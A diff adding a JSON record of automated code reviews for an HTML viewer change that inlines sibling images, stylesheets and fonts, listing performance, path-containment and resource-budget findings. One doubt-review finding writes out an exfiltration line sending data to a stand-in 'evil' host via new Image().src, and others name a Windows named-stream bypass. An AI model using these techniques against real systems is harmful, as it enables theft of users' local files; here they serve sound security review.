@@ -1,0 +1,339 @@
+{
+  "schema_version": 1,
+  "run_id": "iterate-2026-11-02-smartviewer-html-images",
+  "reviews": {
+    "self": {
+      "review_type": "self",
+      "status": "completed",
+      "findings_count": 0,
+      "findings": [],
+      "provider": null,
+      "completed_at": "2026-11-02T20:57:03.266287+00:00",
+      "disposition": null,
+      "recorded_by": "self-review",
+      "parse_status": null,
+      "raw_excerpt": null,
+      "model_tier": "inherit"
+    },
+    "plan": {
+      "review_type": "plan",
+      "status": "not_applicable",
+      "findings_count": 0,
+      "findings": [],
+      "provider": null,
+      "completed_at": "2026-11-02T21:10:21.598052+00:00",
+      "disposition": "small run (classifier: small + touches_auth); plan/architecture reviews run at medium+ only; the security rule was instead covered by spec, code, doubt and external code review",
+      "recorded_by": "none",
+      "parse_status": null,
+      "raw_excerpt": null,
+      "reason_code": "complexity-below-threshold"
+    },
+    "code": {
+      "review_type": "code",
+      "status": "completed",
+      "findings_count": 8,
+      "findings": [
+        {
+          "severity": "high",
+          "category": "performance",
+          "file": "client/src/components/external/SmartViewer/htmlInlineAssets.ts",
+          "line": 69,
+          "finding": "@import fan-out has no total budget: 10 imports per file to depth 3, siblings do not share `seen`, loader.text is neither cached nor counted. ~1100 text fetches of the same file, multi-GB string, tab freeze/OOM from untrusted HTML.",
+          "suggestion": "Cache loader.text per resolved path, dedupe imports document-wide, add a shared byte/fetch budget for text and cap total output size; add a diamond/repeated-import test.",
+          "source": "code-reviewer"
+        },
+        {
+          "severity": "medium",
+          "category": "performance",
+          "file": "client/src/components/external/SmartViewer/htmlInlineAssets.ts",
+          "line": 28,
+          "finding": "MEDIA_TAG (and the pre-existing LINK_TAG) is quadratic on unterminated tags such as `<img <img <img ...`; `[^'\">]` also consumes `<`. A hostile 1 MB HTML can freeze the tab; mapTags runs it twice.",
+          "suggestion": "Exclude `<` from the bare class ([^'\"<>]) or find tag ends with a linear indexOf scanner; add a perf-bound test.",
+          "source": "code-reviewer"
+        },
+        {
+          "severity": "medium",
+          "category": "correctness",
+          "file": "server/src/core/session-file/asset-access.ts",
+          "line": 70,
+          "finding": "Lexical containment compares the requested (lexical) path with pageDir, a realpath. A page reached through a symlink/junction/subst/8.3 folder gets 403 asset_outside_page_folder for every asset.",
+          "suggestion": "Also accept lexical containment in path.dirname(path.resolve(owner)); keep realpath containment against the real pageDir as the authority; test a symlinked page folder.",
+          "source": "code-reviewer"
+        },
+        {
+          "severity": "medium",
+          "category": "security",
+          "file": "server/src/core/session-file/asset-access.ts",
+          "line": 43,
+          "finding": "Broad-folder guard only blocks a filesystem root or the exact home dir; a page in ~/Desktop, ~/Documents, ~/Downloads, C:/Users, /home or /tmp exposes the whole subtree's non-hidden images/css/fonts to a script that can exfiltrate via img-src https:.",
+          "suggestion": "Treat well-known broad folders as too broad (home subfolders Desktop/Documents/Downloads, parents of home, /home, /Users, C:/Users, os.tmpdir(), roots), or restrict depth, or record as accepted risk.",
+          "source": "code-reviewer"
+        },
+        {
+          "severity": "low",
+          "category": "correctness",
+          "file": "client/src/components/external/SmartViewer/htmlInlineAssets.ts",
+          "line": 106,
+          "finding": "srcset is split on every comma (breaks data: candidates and URLs with commas; re-join inserts whitespace). SRC_ATTR/SRCSET_ATTR can match inside another attribute's quoted value (alt=\" src=x.png\").",
+          "suggestion": "Use the srcset grammar; keep unchanged candidates byte-exact; scan attributes with a quote-respecting tokenizer.",
+          "source": "code-reviewer"
+        },
+        {
+          "severity": "low",
+          "category": "readability",
+          "file": "client/src/components/external/SmartViewer/HtmlRenderer.tsx",
+          "line": 63,
+          "finding": "`source` stored in `inlined` is never read (dead state).",
+          "suggestion": "Drop it or use it to mark stale.",
+          "source": "code-reviewer"
+        },
+        {
+          "severity": "low",
+          "category": "performance",
+          "file": "client/src/components/external/SmartViewer/htmlResourceLoader.ts",
+          "line": 71,
+          "finding": "20 MB cap is checked after the blob is downloaded; up to 40 parallel 5 MB fetches can be buffered (~200 MB transient).",
+          "suggestion": "Check Content-Length first and/or limit concurrency.",
+          "source": "code-reviewer"
+        },
+        {
+          "severity": "low",
+          "category": "correctness",
+          "file": "client/src/components/external/SmartViewer/htmlInlineAssets.ts",
+          "line": 141,
+          "finding": "Test gaps: symlinked page folder, @import diamond/repetition, unterminated-tag timing, comma srcset, ::$DATA/trailing dot/8.3 on the server.",
+          "suggestion": "Add tests.",
+          "source": "code-reviewer"
+        }
+      ],
+      "provider": null,
+      "completed_at": "2026-11-02T20:59:56.231488+00:00",
+      "disposition": null,
+      "recorded_by": "code-reviewer",
+      "parse_status": null,
+      "raw_excerpt": null,
+      "model_tier": "inherit",
+      "verdict": "pass",
+      "reviewed_commit": "142b26c3599573acf5567a1678f4e45b1425a514"
+    },
+    "doubt": {
+      "review_type": "doubt",
+      "status": "completed",
+      "findings_count": 7,
+      "findings": [
+        {
+          "severity": "high",
+          "category": "boundary / exfiltration",
+          "file": "client/src/components/external/SmartViewer/HtmlRenderer.tsx",
+          "line": 33,
+          "finding": "Claim under doubt: The change exposes no more than the page's own content and keeps the viewer's file reads bounded. — The sandbox CSP still allows img-src data: blob: https: and scripts run. The viewer now reads sibling files for the untrusted page; a script reads img.src of an embedded data URI and leaks it via new Image().src='https://evil/?d='+chunk. A page can name any image/font/css in its folder tree by guessing names, and learns which exist (refused images fire onerror). The evidence gate only proves the page was mentioned. The header comment 'only the file's own content is at stake' is no longer true. The broad-folder denylist covers only root, home, tmp, Desktop, Documents, Downloads, Pictures.",
+          "suggestion": null,
+          "source": "doubt-reviewer"
+        },
+        {
+          "severity": "high",
+          "category": "concurrency / amplification",
+          "file": "server/src/external/session-file/routes.ts",
+          "line": 71,
+          "finding": "Claim under doubt: The change exposes no more than the page's own content and keeps the viewer's file reads bounded. — Every asset request runs a full decideSessionFileAccess on the owner page, i.e. an uncached scan of up to 48 MB JSONL, serialized process-wide with MAX_PENDING_SCANS=8 and a 20 s timeout. A page with 40 images + 20 imports causes up to 60 serialized scans; the backlog overflows, findSessionEvidence returns incomplete and assets answer 403 path_not_evidenced on large sessions. Client aborts after 5 s while the server scan keeps its slot. Re-rendering restarts the cycle and starves other evidence users.",
+          "suggestion": null,
+          "source": "doubt-reviewer"
+        },
+        {
+          "severity": "medium",
+          "category": "resource blow-up",
+          "file": "client/src/components/external/SmartViewer/htmlInlineAssets.ts",
+          "line": 76,
+          "finding": "Claim under doubt: The change exposes no more than the page's own content and keeps the viewer's file reads bounded. — Distinct files (40) and fetched bytes (20 MB) are capped, but the output is not: the data URI is substituted at every occurrence. 2000 img tags referencing one 5 MB file yield about 13 GB of srcdoc. Bytes are counted before base64 expansion and CSS replacements are not counted.",
+          "suggestion": null,
+          "source": "doubt-reviewer"
+        },
+        {
+          "severity": "medium",
+          "category": "async / state",
+          "file": "client/src/components/external/SmartViewer/HtmlRenderer.tsx",
+          "line": 72,
+          "finding": "Claim under doubt: The change exposes no more than the page's own content and keeps the viewer's file reads bounded. — Effect cleanup only sets cancelled. In-flight fetches, queued acquire() waiters and the loader are never aborted; StrictMode or text changes rerun the whole 40-asset fetch while the old one completes. The loader is rebuilt per run, so no cache across text changes.",
+          "suggestion": null,
+          "source": "doubt-reviewer"
+        },
+        {
+          "severity": "low",
+          "category": "parser differential",
+          "file": "client/src/components/external/SmartViewer/htmlMarkupScan.ts",
+          "line": 139,
+          "finding": "Claim under doubt: The change exposes no more than the page's own content and keeps the viewer's file reads bounded. — Could not turn tokenizer/CSS regex differentials into an unauthorised read; server-side containment is the authority and receives literal paths. Entities, CSS escapes and backslash traversal reach the server as literal names (missing or rejected). Wrong/missing content only: entity in a path, base href ignored, xmp/noembed/plaintext/noscript/template/iframe srcdoc not masked, url() inside CSS comments consume the budget.",
+          "suggestion": null,
+          "source": "doubt-reviewer"
+        },
+        {
+          "severity": "low",
+          "category": "Windows path edge",
+          "file": "server/src/core/session-file/asset-access.ts",
+          "line": 69,
+          "finding": "Claim under doubt: The change exposes no more than the page's own content and keeps the viewer's file reads bounded. — Extension check uses path.extname on the raw spelling; named stream on a real file such as notes.txt:evil.png has extname .png, passes the lexical check and has no dot segment. Impact low (attacker must plant the stream).",
+          "suggestion": null,
+          "source": "doubt-reviewer"
+        },
+        {
+          "severity": "low",
+          "category": "hidden coupling",
+          "file": "client/src/components/external/SmartViewer/htmlInlineAssets.ts",
+          "line": 69,
+          "finding": "Claim under doubt: The change exposes no more than the page's own content and keeps the viewer's file reads bounded. — claimImport is page-wide first-come-first-served: a stylesheet imported from two places is inlined once, the second @import stays and is blocked by CSP. claimImport is consumed before the fetch, so a failed or timed-out text() burns one of the 20 slots.",
+          "suggestion": null,
+          "source": "doubt-reviewer"
+        }
+      ],
+      "provider": null,
+      "completed_at": "2026-11-02T21:05:16.816976+00:00",
+      "disposition": null,
+      "recorded_by": "doubt-reviewer",
+      "parse_status": null,
+      "raw_excerpt": null,
+      "model_tier": "inherit",
+      "verdict": "pass",
+      "reviewed_commit": "142b26c3599573acf5567a1678f4e45b1425a514"
+    },
+    "external_code": {
+      "review_type": "external_code",
+      "status": "completed",
+      "findings_count": 9,
+      "findings": [
+        {
+          "severity": "medium",
+          "category": "bug ·",
+          "file": null,
+          "line": null,
+          "finding": "route `text()` through the same acquire/dispose/timeout machinery as `dataUri` (or at minimum check `disposed` first and register an AbortController).",
+          "suggestion": null,
+          "source": "external-review"
+        },
+        {
+          "severity": "medium",
+          "category": "edge-case ·",
+          "file": null,
+          "line": null,
+          "finding": "also treat \"different drive than home/tmp\" folders via an explicit drive-root/depth heuristic, or compare drive letters before relying on `path.relative`.",
+          "suggestion": null,
+          "source": "external-review"
+        },
+        {
+          "severity": "low",
+          "category": "bug ·",
+          "file": null,
+          "line": null,
+          "finding": "scan for the tag's real end respecting quotes (reuse the LINK_TAG-style pattern) before recording `start`.",
+          "suggestion": null,
+          "source": "external-review"
+        },
+        {
+          "severity": "low",
+          "category": "edge-case ·",
+          "file": null,
+          "line": null,
+          "finding": "leave the duplicate as a no-op or emit the cached inlined body again within the output budget; at minimum document it.",
+          "suggestion": null,
+          "source": "external-review"
+        },
+        {
+          "severity": "low",
+          "category": "edge-case ·",
+          "file": null,
+          "line": null,
+          "finding": "stream-count bytes while reading and abort past the cap.  Tests: the new unit tests are genuinely behavioral (byte-exactness of untouched srcset candidates, quote-respecting attribute tokenizer, budget cut-off mid-document, dispose semantics with queued waiters, diamond @import fan-out, perf bound on hostile markup) and would fail against a naive implementation. Server tests cover traversal, symlink escape, ADS/spelling, broad folders, and memo semantics including negative-decision non-caching. Spec requirements 1–5 and all stated limits map to named constants that the tests exercise. No regressions visible: `maskNonMarkup` moved but re-exported; `withTimeout`, `ABSOLUTE_HREF`, `attr` remain available; `inlineLinkedStyles` keeps its original signature with an optional 5th parameter; `sessionFileUrl` and `WIN_DEVICE` changes are backward-compatible.  Overall: ship-with-fixes is close, but every remaining defect is low-to-medium hygiene/edge content, the security-critical server rule matches the spec (including the memoization and accepted residual risk), and the earlier high findings are demonstrably fixed in this diff. Approve with the loader `text()` bound and the cross-drive `isBroadFolder` gap as follow-ups.  SHIPWRIGHT_VERDICT: approve",
+          "suggestion": null,
+          "source": "external-review"
+        },
+        {
+          "severity": "medium",
+          "category": "spec",
+          "file": "client/src/components/external/SmartViewer/htmlResourceLoader.ts",
+          "line": 129,
+          "finding": "Stylesheet requests bypass the shared loader limits. `text()` calls `fetchTextFile` directly, so linked stylesheets and imports do not count toward the 40-file or 20 MB limits, do not use the six-request semaphore, and are not aborted by `dispose()`. Twenty linked stylesheets can start concurrently; the wrapper timeout stops waiting without cancelling those requests.",
+          "suggestion": "Route stylesheet reads through the same counted, cancellable request queue as images and fonts, with shared file and byte budgets.",
+          "source": "external-review"
+        },
+        {
+          "severity": "medium",
+          "category": "spec",
+          "file": "client/src/components/external/SmartViewer/htmlInlineAssets.ts",
+          "line": 75,
+          "finding": "The 30 MB output limit counts only substituted data URIs. Imported stylesheet bodies are inserted without calling `spend()`, and linked stylesheet bodies are likewise uncounted. Twenty linked stylesheets plus twenty imports can exceed the output limit before any images are embedded.",
+          "suggestion": "Budget stylesheet text and replacement overhead as well as data URIs, and enforce a final document-size ceiling before constructing `srcdoc`.",
+          "source": "external-review"
+        },
+        {
+          "severity": "medium",
+          "category": "bug",
+          "file": "client/src/components/external/SmartViewer/htmlInlineAssets.ts",
+          "line": 69,
+          "finding": "Page-wide import deduplication changes CSS cascade behavior. For example, `@import \"red.css\"; @import \"blue.css\"; @import \"red.css\";` should end with red taking precedence, but the final import remains relative and cannot load in the iframe, leaving blue in effect. The diamond test explicitly expects this semantic change.",
+          "suggestion": "Cache fetched stylesheet text while preserving each import occurrence. Detect cycles using the current recursion stack and bound repeated expansion with the shared output budget.",
+          "source": "external-review"
+        },
+        {
+          "severity": "medium",
+          "category": "bug",
+          "file": "client/src/components/external/SmartViewer/htmlInlineAssets.ts",
+          "line": 84,
+          "finding": "Rewriting drops URL fragments. A valid CSS reference such as `url(\"icons.svg#check\")` becomes a data URI without `#check`, so the browser no longer selects the referenced SVG symbol or fragment. Image attributes take the same path and lose fragments too.",
+          "suggestion": "Separate the fragment from the file path, fetch and cache the file without it, then append the fragment to the generated data URI.  Overall assessment: ship-with-fixes. The main rendering and access-control paths are implemented, but stylesheet handling bypasses required resource bounds and changes valid CSS behavior.  SHIPWRIGHT_VERDICT: revise",
+          "source": "external-review"
+        }
+      ],
+      "provider": null,
+      "completed_at": "2026-11-02T21:09:02.834454+00:00",
+      "disposition": null,
+      "recorded_by": "external-review-json",
+      "parse_status": "structured",
+      "raw_excerpt": "[glm] The diff is the implementation *plus* the planning/review artifacts from its own review cycle; the substantive code already incorporates the previously-flagged high findings (output budget `spend`, `dispose()` abort, `[^'\"<>]` tag regex, lexical-vs-realpath fallback, memoized owner decision, ADS colon check). Reviewing the code itself:\n\n- Category: bug · Severity: medium · File: client/src/components/external/SmartViewer/htmlResourceLoader.ts (~line 117, `text: async (path) => (await fetchTextFile(urlFor(path))).text`) — `text()` is the one loader method that bypasses every bound: no `acquire()` in-flight slot, no `dispose()` check, no abort, and it isn't counted against `maxBytes`. After `dispose()` the orphaned inlining promise chain (inlineLinkedStyles → processCss) still fetches stylesheets to completion, and `inlineLinkedStyles` fires up to 20 concurrent text fetches. The header comment claims text is bounded by the loader's limits; it isn't.\n  Suggestion: route `text()` through the same acquire/dispose/timeout machinery as `dataUri` (or at minimum check `disposed` first and register an AbortController).\n\n- Category: edge-case · Severity: medium · File: server/src/core/session-file/asset-access.ts (~line 60, `isBroadFolder`) — on Windows, `path.relative(dir, home)` (and `os.tmpdir()`) returns an *absolute* path when `dir` is on a different drive; `within()` then returns `false` (it rejects absolute rels), so the home-ancestor and tmp checks silently no-op for pages on a non-system drive. The root check still catches bare roots, but e.g. `D:\\Users\\shared\\report.html` gets the full-subtree asset read with no broad-folder check.\n  Suggestion: also treat \"different drive than home/tmp\" folders via an explicit drive-root/depth heuristic, or compare drive letters before relying on `path.relative`.\n\n- Category: bug · Severity: low · File: client/src/components/external/SmartViewer/htmlMarkupScan.ts (~line 48, `maskNonMarkup` style-block recording) — the b […truncated]\n\n[openai] - Category: spec\n- Severity: medium\n- File: client/src/components/external/SmartViewer/htmlResourceLoader.ts:129\n- Finding: Stylesheet requests bypass the shared loader limits. `text()` calls `fetchTextFile` directly, so linked stylesheets and imports do not count toward the 40-file or 20 MB limits, do not use the six-request semaphore, and are not aborted by `dispose()`. Twenty linked stylesheets can start concurrently; the wrapper timeout stops waiting without cancelling those requests.\n- Suggestion: Route stylesheet reads through the same counted, cancellable request queue as images and fonts, with shared file and byte budgets.\n\n- Category: spec\n- Severity: medium\n- File: client/src/components/external/SmartViewer/htmlInlineAssets.ts:75\n- Finding: The 30 MB output limit counts only substituted data URIs. Imported stylesheet bodies are inserted without calling `spend()`, and linked stylesheet bodies are likewise uncounted. Twenty linked stylesheets plus twenty imports can exceed the output limit before any images are embedded.\n- Suggestion: Budget stylesheet text and replacement overhead as well as data URIs, and enforce a final document-size ceiling before constructing `srcdoc`.\n\n- Category: bug\n- Severity: medium\n- File: client/src/components/external/SmartViewer/htmlInlineAssets.ts:69\n- Finding: Page-wide import deduplication changes CSS cascade behavior. For example, `@import \"red.css\"; @import \"blue.css\"; @import \"red.css\";` should end with red taking precedence, but the final import remains relative and cannot load in the iframe, leaving blue in effect. The diamond test explicitly expects this semantic change.\n- Suggestion: Cache fetched stylesheet text while preserving each import occurrence. Detect cycles using the current recursion stack and bound repeated expansion with the shared output budget.\n\n- Category: bug\n- Severity: medium\n- File: client/src/components/external/SmartViewer/htmlInlineAssets.ts:84\n- Finding: Rewriting drops URL fragmen […truncated]",
+      "verdicts": {
+        "openai": "revise",
+        "glm": "approve"
+      },
+      "model_tier": "inherit"
+    },
+    "spec": {
+      "review_type": "spec",
+      "status": "completed",
+      "findings_count": 0,
+      "findings": [],
+      "provider": null,
+      "completed_at": "2026-11-02T20:57:47.127433+00:00",
+      "disposition": null,
+      "recorded_by": "spec-reviewer",
+      "parse_status": null,
+      "raw_excerpt": null,
+      "model_tier": "inherit",
+      "verdict": "pass",
+      "reviewed_commit": "142b26c3599573acf5567a1678f4e45b1425a514"
+    },
+    "plan_internal": {
+      "review_type": "plan_internal",
+      "status": "not_applicable",
+      "findings_count": 0,
+      "findings": [],
+      "provider": null,
+      "completed_at": "2026-11-02T21:10:21.822384+00:00",
+      "disposition": "small run (classifier: small + touches_auth); plan/architecture reviews run at medium+ only; the security rule was instead covered by spec, code, doubt and external code review",
+      "recorded_by": "none",
+      "parse_status": null,
+      "raw_excerpt": null,
+      "reason_code": "complexity-below-threshold"
+    },
+    "architecture_internal": {
+      "review_type": "architecture_internal",
+      "status": "not_applicable",
+      "findings_count": 0,
+      "findings": [],
+      "provider": null,
+      "completed_at": "2026-11-02T21:10:22.002549+00:00",
+      "disposition": "small run (classifier: small + touches_auth); plan/architecture reviews run at medium+ only; the security rule was instead covered by spec, code, doubt and external code review",
+      "recorded_by": "none",
+      "parse_status": null,
+      "raw_excerpt": null,
+      "reason_code": "complexity-below-threshold"
+    }
+  }
+}
